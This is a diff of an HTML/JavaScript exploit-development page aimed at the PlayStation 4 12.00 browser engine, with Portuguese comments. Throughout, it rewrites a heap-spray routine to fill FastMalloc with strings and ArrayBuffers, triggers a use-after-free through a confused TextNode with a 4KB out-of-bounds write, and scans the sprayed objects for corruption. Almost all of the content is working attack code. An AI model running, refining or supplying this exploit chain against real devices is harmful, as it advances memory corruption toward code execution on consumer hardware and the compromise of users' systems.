@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Common Object Overlap</title>
+<title>PS4 12.00 - FastMalloc Strike</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → FastMalloc → Common JS Object Scan</h2>
+<h2>UAF → FastMalloc Strike → JSC String/Buffer Scan</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -20,30 +20,28 @@ function log(msg){
 }
 
 // ==========================
-// 🌍 HEAP FENG SHUI (ATUALIZADO SEM FLOAT64ARRAY)
-function setupInterleavedFengShui(){
-    log("[*] Iniciando Interleaved Spray (Array/Objeto)...");
+// 🌍 FAST-MALLOC SPRAY (AS NOVAS ISCAS)
+// Strings e Buffers costumam ser alocados no mesmo "bairro" que o DOM
+function setupFastMallocSpray(){
+    log("[*] Iniciando FastMalloc Spray (Strings e Buffers)...");
 
-    window.dom_spray = [];
-    window.heap_spray = []; // Agora são Arrays Comuns
-    window.obj_spray = [];  // Agora são Objetos Literais
+    window.str_spray = [];
+    window.ab_spray = [];
 
     for(let i=0; i<6000; i++){
-        // 1. Isca DOM (Buffer de texto um pouco maior para parear com a corrupção)
-        let t = document.createTextNode("TXT_BAIT_" + i + "_" + "B".repeat(0x80));
-        document.body.appendChild(t);
-        window.dom_spray.push(t);
+        // 1. Isca de String JS (Vai para o FastMalloc)
+        // Usamos "B" para contrastar com nosso tiro de "X"
+        window.str_spray.push("BAIT_STR_" + i + "_" + "B".repeat(0x200));
 
-        // 2. Isca de Array Normal do JS (Fora do Gigacage!)
-        let normal_array = [0x1337, i, 0x1337, i];
-        window.heap_spray.push(normal_array);
-
-        // 3. Isca de Objeto JS Literal
-        let normal_obj = { signature: 0x1337, id: i, payload: "ISCA" };
-        window.obj_spray.push(normal_obj);
+        // 2. Isca de ArrayBuffer (Dados brutos também costumam ir pro FastMalloc)
+        let ab = new ArrayBuffer(0x200);
+        let v = new Uint32Array(ab);
+        v[0] = 0x13371337; // Assinatura
+        v[1] = i;          // ID
+        window.ab_spray.push(v);
     }
 
-    log("[*] Spray de Objetos Comuns concluído!");
+    log("[*] Spray FastMalloc concluído!");
 }
 
 // ==========================
@@ -104,9 +102,9 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 PROBE ATUALIZADO PARA OBJETOS COMUNS
+// 🔬 PROBE DO FASTMALLOC
 function domOverlapProbe(fsTarget){
-    log("---- PROBE DE OBJETOS COMUNS ----");
+    log("---- FASTMALLOC PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
@@ -115,43 +113,35 @@ function domOverlapProbe(fsTarget){
         if(n.nodeType === 3){
             log("[!!!] TEXTNODE CONFUSION");
 
-            // 💣 DISPARA O TIRO LONGO (4KB de "A"s)
+            // 💣 DISPARA O TIRO LONGO: Trocamos para "X" para identificar fácil
             try{
-                n.data = "A".repeat(0x1000); 
-                log("[PWN] Escrita OOB disparada (4KB)");
+                n.data = "X".repeat(0x1000); 
+                log("[PWN] OOB write disparado (4KB de 'X')");
             }catch(e){
                 log("[UAF] write crash");
             }
 
             // ==========================
-            // 🔥 SCANNER
+            // 🔥 SCANNER DOS INFILTRADOS
             try{
-                // 1. Checa as Iscas de Array Normal
-                for(let i=0; i<window.heap_spray.length; i++){
-                    if(window.heap_spray[i][0] !== 0x1337){
-                        log("[$$$] JACKPOT JSC! Array normal corrompido @ " + i);
+                // 1. Checa se o tiro rasgou alguma String do JS
+                for(let i=0; i<window.str_spray.length; i++){
+                    // Se a string que era cheia de "B" de repente tiver "X", ACERTAMOS!
+                    if(window.str_spray[i].includes("XXXX")){
+                        log("[$$$] FASTMALLOC HIT! JS String corrompida @ " + i);
                         return;
                     }
                 }
 
-                // 2. Checa as Iscas de Objetos Literais
-                for(let i=0; i<window.obj_spray.length; i++){
-                    if(window.obj_spray[i].signature !== 0x1337){
-                        log("[$$$] JACKPOT JSC! Objeto literal corrompido @ " + i);
+                // 2. Checa se o tiro pegou algum ArrayBuffer
+                for(let i=0; i<window.ab_spray.length; i++){
+                    if(window.ab_spray[i][0] !== 0x13371337){
+                        log("[$$$] FASTMALLOC HIT! ArrayBuffer corrompido @ " + i);
                         return;
                     }
                 }
 
-                // 3. Checa o próprio DOM TextNode vizinho
-                for(let i=0; i<window.dom_spray.length; i++){
-                    let txt = window.dom_spray[i].data;
-                    if(!txt || !txt.includes("TXT_BAIT_")){
-                        log("[!!!] DOM TextNode Vizinho corrompido @ " + i);
-                        return;
-                    }
-                }
-
-                log("[SCAN] Nada atingido ainda...");
+                log("[SCAN] Nada atingido (Tiro passou no vazio)");
 
             }catch(e){
                 log("[UAF] scan crash");
@@ -196,11 +186,11 @@ function trigger(fsTarget){
 function runTest(){
     log("[*] Iniciando teste...");
     
-    // Executa a pressão de memória obrigatória que você descobriu (Float64Array intocável)
+    // Mantém sua pressão de memória intocável
     window.heap_press = setupHeap(); 
 
-    // Aloca nossas novas iscas fracas!
-    setupInterleavedFengShui(); 
+    // Planta os nossos espiões na arena do DOM
+    setupFastMallocSpray(); 
 
     let fsTarget=setupFullscreen();
     window.onblur=function(){
